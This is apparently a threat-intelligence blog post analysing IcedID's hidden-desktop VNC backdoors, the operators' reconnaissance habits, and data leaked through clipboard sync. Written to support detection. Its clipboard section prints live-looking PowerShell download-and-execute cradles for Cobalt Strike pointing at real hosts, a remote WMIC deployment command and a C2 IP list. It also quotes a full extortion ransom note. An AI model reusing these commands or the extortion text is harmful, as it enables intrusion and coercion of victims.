IcedID‚Äôs VNC Backdoors: Dark Cat, Anubis & Keyhole
blog.nviso.eu/2023/03/20/icedids-vnc-backdoors-dark-cat-anubis-keyhole/
March 20, 2023

IcedID (a.k.a. BokBot) is a popular Trojan who first emerged in 2017 as an Emotet delivery.
Originally described as a banking Trojan, IcedID shifted its focus to embrace the
extortion/ransom trend and nowadays acts as an initial access broker mostly delivered
through malspam campaigns. Over the last few years, IcedID has commonly been seen
delivering Cobalt Strike prior to a multitude of ransomware strains such as Conti or REvil.
IcedID itself is composed of multiple modules, one of which is a poorly documented VNC
backdoor (Virtual Network Computing) acting as a cross-platform remote desktop solution.
Existence of this module (branded ‚ÄúHDESK‚Äù or ‚ÄúHDESK bot‚Äù) is just partially mentioned by
Malwarebytes (2017) and Kaspersky (2021) while its usage has been widely observed and
occasionally vulgarized as ‚ÄúDark VNC‚Äù.
As part of our research efforts, NVISO has been analyzing IcedID‚Äôs command & control
communications. In this blog-post we will share insights into IcedID‚Äôs VNC backdoor(s)
as seen from an attacker‚Äôs perspective, insights we obtained by extracting and
reassembling VNC (RFC6143) traffic embedded within private and public captures published
by Brad Duncan.
In this post we introduce the three variants we observed as well as their capabilities: Dark
Cat, Anubis and Keyhole. We‚Äôll follow by exposing common techniques employed by the
operators before revealing information they leaked through their clipboard data.

HDESK Variants
During our analysis of both public and private IcedID network captures, we identified 3 VNC
backdoor variants, all part of the HDESK strain. These backdoors are typically activated
during the final initial-access stages to initiate hands-on-keyboard activity. Supposedly short
for ‚ÄúHidden Desktop‚Äù, HDESK leverages Windows features allowing the backdoor to create a
hidden desktop environment not visible to the compromised user. Within this hidden
environment, the threat actors can start leveraging the user interface to perform regular tasks
such as web browsing, reading mails in Outlook or executing commands through the
Command Prompt and PowerShell.
We believe with medium confidence that these backdoors are not exclusive to IcedID as we
occasionally observed their usage alongside network traffic attributed by third-party vendors
to other access-broker families.

Dark Cat VNC
The ‚ÄúDark Cat VNC‚Äù variant was first observed in November 2021 and is believed to be the
named releases v1.1.2 and v1.1.3. Its usage was still extensively observed by the end of
2022. Upon initial access, the home screen presents the operator with multiple options to
create new sessions alongside backdoor metrics such as idle time or lock state.

Figure 1: The Dark Cat VNC interface.

User Session
Figure 2: A Dark Cat USER session.
The USER session exists in three variations (read, standard and black) which allows the
operator to switch the VNC view to the user‚Äôs visible desktop.

HDESK Session
The HDESK session exists in three variations as well: standard, Tmp and NM (also called bot).
This session type causes the backdoor to create a new hidden desktop not visible to the
compromised user.
Based on the activity we observed, the HDESK sessions are (understandably) preferred by the
operators.

Figure 3: A Dark Cat HDESK session.
As HDESK sessions by default do not benefit from Windows‚Äôs built-in UI, operators are
presented with an alternative start-menu to launch common programs. In Dark Cat these are
Chrome, Firefox, Internet Explorer, Outlook, Command Prompt, Run and the Task Manager.
A Windows Shell button is also foreseen which we believe, if used, will spawn the regular
Windows UI most of the users are used to. Starting with Dark Cat v1.1.3 Edge Chromium
furthermore joins the list of available software.

Figure 4: The Dark Cat HDESK session interface.
Besides the alternate start-menu, operators can access some settings using the top-left
orange icon which includes:
Defining the hidden windows‚Äô sizes.
Defining the Chrome profile to use (lite or not).
Deleting the browser‚Äôs profile(s).
Killing the child process(es).

WebCam Session

3/17

The WebCam sessions exist in three variations. While we were unable to capture its usage
(honeypots lack webcams and operators do not attempt to use this session kind), its
presence suggests IcedID‚Äôs VNC backdoors are capable of capturing compromised devices‚Äô
webcam feeds.

Anubis VNC
The ‚ÄúAnubis VNC‚Äù variant was first observed in January 2022 and is believed to be the
named release v1.2.0. Its usage was last observed in Q3 2022. No capability differences
were observed between Anubis and Dark Cat v1.1.3.

Figure 6: The Anubis VNC interface.

KEYHOLE VNC
The ‚ÄúKEYHOLE VNC‚Äù variant was first observed in October 2022 and is believed to be the
named releases v1.3 as well as v2.1. Its usage was observed as recently as Q1 2023.

Grayscale
The first major change observed within Keyhole is its new color palette capability where
operators can pick regular RGB (a.k.a. colored) or Grayscaled (a.k.a. black & white) feeds.
The actual intend of this feature is unclear as, at least from a network perspective, both RGB
and Grayscale consume as many bytes per pixel, resulting in equal performances.

HDESK Sessions
Keyhole v1.3 provides a refreshed start-menu where icons have been updated and options
renamed; The once cryptic Win Shell option has been rebranded to the My Computer
option.

Figure 8: The Keyhole (v1.3) HDESK session interface in gray-scaled color palette.
Later-on, with v2.1, Keyhole renamed additional options and introduced the PowerShell and
Desktop options. We assess with low confidence that the Desktop option only differs from the
My Computer option by rendering the background as well, whereas the latter option was only
seen generating desktop views without background image.

Modus Operandi
Obtaining recordings of threat actors operating is useful to understand which technical
capabilities they are equipped with, but also allows the identification of TTPs (Tactics,
Techniques & Procedures) they might employ. In the following section we will review some of
the most re-occurring actions we observed IcedID operators perform through the above
described backdoors.

üçØ Nothing confidential here‚Ä¶

All media published within this section were reconstructed from publicly published artifacts.
As all information is public, we have refrained from redacting otherwise sensitive details such
as company names and accounts.

Task Manager
To no surprise, the usage of the Task Manager to identify running software was extremely
common. While hard to detect as operators did not attempt to interfere with security
software, the usage of this graphical utility outlined one interesting drawback. On multiple
(non-published) occasions we observed actors identifying known security tooling based on
the process icon whereas other icon-less tooling blended in with many of Windows‚Äô icon-less
applications.
Figure 10: An Anubis operator performing interactive reconnaissance through the Task
Manager.

Outlook
Another quite common technique was the inspection of Outlook, most likely to identify poorlypopulated honeypot networks. As was the case for the Task Manager, the graphical usage of
Outlook by the operator is indistinguishable from regular user activity. From the available
recordings, no attempts were made to use Outlook for further phishing/spam.
Figure 11: An Dark Cat operator performing interactive reconnaissance through Outlook.

7/17

Figure 12: A Dark Cat operator inspecting Outlook‚Äôs ‚ÄúRules and Alerts‚Äù settings.
On one singular instance, we observed the actor expressing interests in Outlook‚Äôs rules. The
backdoor session was however terminated before they undertook any actions making it
unclear whether this was part of the reconnaissance activities or were planning to set up
malicious email redirection rules.

Web Browsers
From the available browsers, Edge and Chrome were the favorites. Using these, operators
commonly validated the browser‚Äôs connectivity by accessing Amazon.
During one intrusion, the operator went as far as attempting to access the compromised
user‚Äôs Amazon payment information. This attempt is a good reminder that beyond a user‚Äôs
corporate identity, personal accounts are definitely at risk as well.

Figure 13: A Dark Cat operator accessing Amazon‚Äôs ‚ÄúYour Payments‚Äù account page.

Figure 14: A Keyhole operator inspecting Edge‚Äôs version details.
On some occasions operators accessed the edge://version URL. While this page exposes
mostly useless information to attackers, the capture provides a sheer amount of uncommon
flags usable for threat hunting.

9/17

Noteworthy is the Profile path located within the user‚Äôs temporary directory and passed
using the --user-data-dir= flag, a pattern that from our available telemetry seems quite
uncommon for msedge.exe in enterprise environments. The pattern is however occasionally
used for applications such as opera_autoupdate.exe and msedgewebview2.exe.
Also worth noting is the usage of edge://settings/passwords to identify additional
accounts.

10/17

Figure 15: Edge displaying a warning banner due to the usage of an unsupported flag during
a Dark Cat session.
A final commonly observed pattern is the usage of the unsupported --no-sandbox
command-line flag in Edge resulting in a notification banner. From our available telemetry in
enterprise environments, the usage of this flag for Edge is uncommon, as opposed to
Electron-based applications (including Microsoft Teams and WhatsApp) who extensively use
it.

Explorer
Another commonly observed utility to inspect the compromised devices‚Äô files and folders,
including payloads dropped through other channels, is Windows Explorer. As was the case
with Outlook, Explorer‚Äôs usage is indistinguishable from legitimate use making it a hard to
detect technique.
Figure 16: A Keyhole operator interactively using Explorer to inspect folders.

Command Prompt
Last but not least, the command prompt was obviously used extensively. Usage of the
command prompt is commonly leveraged for reconnaissance activities, including the usage
of:
whoami /upn for system user discovery (T1033).
11/17

ipconfig for system network configuration discovery (T1016).
arp -a for both remote system discovery (T1018) and device identification based on

the MAC address.
dir for file and directory discovery (T1083) over SMB (T1021.002).
nltest /dclist for the remote discovery of the domain controllers (T1018).
ping for network connectivity tests to remote systems (T1018).
PowerShell (T1059.001) to deploy Cobalt Strike.
As opposed to the previous mostly passive TTPs, the active usage of the Command Prompt
and PowerShell is often where detection rules obtain a competing chance.

in an HDESK session.

Clipboard Leaks
As VNC acts as a remote desktop solution, another trove of data was found within the
clipboard synchronization feature. By copy/pasting between victim and attacker machines,
operators exposed some additional TTPs and information surrounding their operations.
In this section we will expose the most common and interesting data found within their
clipboards.

Cobalt Strike
As expected, many variations of Cobalt Strike downloaders were observed. These leveraged
both IPs and domain names, as well as standard and non-standard ports such as HTTP on
port 443 or HTTPS on port 8080.
IEX ((new-object net.webclient).downloadstring('http://89.163.251.143:80/a'))
IEX ((new-object net.webclient).downloadstring('http://146.0.72.85:443/waw'))
IEX ((new-object net.webclient).downloadstring('https://searcher.host/a80lvl'))
powershell.exe -nop -w hidden -c "IEX ((new-object
net.webclient).downloadstring('https://solvesalesoft.com:8080/coin'))"

In some cases, the operators directly leveraged PowerShell shellcode stagers as shown in
the following trimmed command.
powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPA...AGQAKAApADsA

For compromised accounts with sufficient access, WMIC commands were further issued to
deploy Cobalt Strike on remote appliances.
C:\Windows\System32\wbem\wmic.exe /node:10.6.21.140 process call create "cmd.exe /c
powershell.exe -nop -w hidden -c ""IEX ((new-object
net.webclient).downloadstring('https://solvesalesoft.com:8080/coin'))"""

12/17

Finally, although we were unable to identify which tooling would rely on such a format, actors
leaked what appears to be a naming convention.
plugin_cobalt_126_8888
plugin_cobalt_126_8080
plugin_cobalt_126_443

Rundll32
Besides Cobalt Strike, operators exposed a DllRegisterServer command which Unit 42
observed being used with rundll32.exe and attributed to the deployment of a VNC
backdoor.
DllRegisterServer --id %id% --group %group% --ip
87.120.8.190,158.69.133.70,185.106.120.99,45.14.226.195,103.124.106.154,149.3.170.201,

NTLM Hashes
Another interesting finding was the presence of NTLM hashes within the clipboard data,
exposing the compromise‚Äôs scope. In this case, the impacted organization was part of a
honeypot environment.

Attacker Notes
While the above findings do not aid attribution, one operator did leak their intrusion notes.
Within these notes (‚Äú[...]‚Äù trimmed for readability) we can observe Russian annotations,
commonly related to CIS-based crime groups, as well information on then-ongoing breaches.
A couple of days after the network traffic was taken, two non-honeypot companies
mentioned within these notes were listed on the Black Basta ransomware group‚Äôs leak site.

Ransom Notes
Another recovered artifact was a full ransom note where authors identified themselves as
belonging to the Karakurt Team. While this note did not allow for the identification of its
victim, it is further evidence of IcedID‚Äôs role within the access broker ecosystem.

Ok, you are reading this - so it means that we have your attention.
Here's the deal :
1. We breached your internal network and took control over all of your systems.
2. We analyzed and located each piece of more-or-less important files while spending
weeks inside.
3. We exfiltrated anything we wanted (the total size of taken data exceeds 372 GB).
FAQ:
- Who the hell are you?
- The Karakurt Team. Pretty skilled hackers I guess.
- WHY ARE YOU DOING THIS?!??
- Our motivation is purely financial.
- We are going to report this to law enforcement.
- You surely can, but be ready that they will confiscate most of your IT
infrastructure, and even if you will later change your mind and decide to pay - they
will not let you.
- Who else already knows about the breach?
- Only You, who received the same message the same way. Nobody else. For now.
- What if I tell you that I do not care and going to ignore this incident.
- That's a very bad choice. If you will not contact us in a timely manner (by
07.01.2022) we will start notifying your employees, clients, partners, subcontractors
and any other persons that should know how you treat your own corporate secrets and
theirs.
- What if I will not contact you even after it?
- Than we shall move forward and start contacting your business competitors and list
of anonymous inside traders we deal with, to find out if they are going to pay us for
your data. When the list of the people who is interested in such data is formed - the
closed online auction starts.
- None will buy what you took! I do not believe you!
- If the auction fails - we will just leak everything online, making sure that this
leak goes straight to the press. We will make sure that your business will bleed by
using any power we have in our posession, both social and technical.
- What happens if I pay?
- Nothing bad will happen.
We will remove everything we took from your network and leave you be.
We will provide the confirmation that the data is deleted.
We will help you to close technical vulnerabilities you have and provide some insight
on how to avoid such incidents if some other perpetrator is interested in you.
We will never tell anybody about it.
- We understand. We are ready to move forward.
- You will find the Access Code at the end of this file, you will need this one to
get in contact with us for further instructions
To contact us using this ID you should do the following :

15/17

1. Download Tor browser - https://www.torproject.org and install it.
2. Open link in TOR browser https://omx5iqrdbsoitf3q4xexrqw5r5tfw7vp3vl3li3lfo7saabxazshnead.onion
3. Insert Access Code 70fdca335aa3fd45a182f39b2592a5d0 inside the field on the page

4. The chat window will open and we will be able to communicate through a secured
channel.
This link is available via "Tor Browser" only!

As a gesture of goodwill, we are ready to give you another leak - it is exclusive and
fresh as well. Just let us know if you are interested in cooperation.

Key Takeaways
While it may not be complex to detect IcedID itself (any modern EDR should detect the
rundll32.exe abuse), distinguishing which interactive actions were taken through a VNC
backdoor does pose challenges. Focus is often put on command-based executions without
considering what could otherwise be considered legitimate user processes such as web
browsers or Outlook. Understanding how these backdoors operate improve responsive and
forensic capabilities by, for example, allowing the identification and explanation of Edge
processes with unlikely or unsupported flags.
This blog post further outlined the capability of network-level visibility which, for complex or
BYOD (Bring Your Own Device) environments, may cope with the lack of endpoint visibility.
Within this spirit, we would like to outline the effectiveness of the Snort IDS rules published
by Networkforensic with regards to the detection of IcedID command & control
communications.
If you are facing challenges keeping your environment clean or need help due to a
